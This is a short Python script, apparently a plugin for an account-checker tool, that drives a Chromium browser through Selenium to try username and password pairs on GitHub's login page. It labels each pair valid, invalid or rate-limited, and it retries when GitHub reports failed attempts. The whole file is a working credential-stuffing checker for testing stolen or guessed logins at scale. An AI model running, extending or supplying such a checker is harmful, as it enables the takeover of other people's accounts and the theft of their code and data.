# -*- coding: utf-8 -*-

"""
NAME:    github-chr.py
AUTHOR:  andre798
VERSION: 1.0.0
DATE:    13.10.2020 
DESC:    A PyBullet-based script to check which GitHub logins are valid
         using selenium chromium library.
"""

from chkutils import ChkUtils

def chkMain(ss, test, rst, captcha, data):
    # Good practice, since 'data' can be both a list or string variable,
    # depending on the number of elements in each line
    if isinstance(data, list):
        user = data[0]
        pswd = data[1]
    else:
        # -200 = Exception = Terminate program!
        return [-200, 'Invalid list format']
    
    # Class containing a list of useful functions.
    chk = ChkUtils()
    
    # Login GET link.
    lnk = 'https://github.com/login'
    
    # Retrieve the login page.
    chk.getnlog(ss, lnk, 'login.htm', 'github-chr', user)
    
    # Fill out the username and password fields.
    ss.find_element_by_id('login_field').send_keys(user)
    ss.find_element_by_id('password').send_keys(pswd)
    
    # Click the 'Sign in' button and wait for the page to reload.
    chk.findExecNWait(ss, 'commit', find = 'name', cmd = 'click')
    src = ss.page_source
    
    # Evaluate the login attempt.
    if src.find('Signed in as') != -1:
        return [100, user] # 100 = Valid password (display in green)
    elif src.find('Incorrect username or password.') != -1:
        return [200, user] # 200 = Invalid password (display in red)   
    elif src.find('There have been several failed attempts') != -1:
        return [-2, user] # -2 = Error = Retry!
    else:
        return [0, user] # 0 = Unknown = Skip (display in yellow)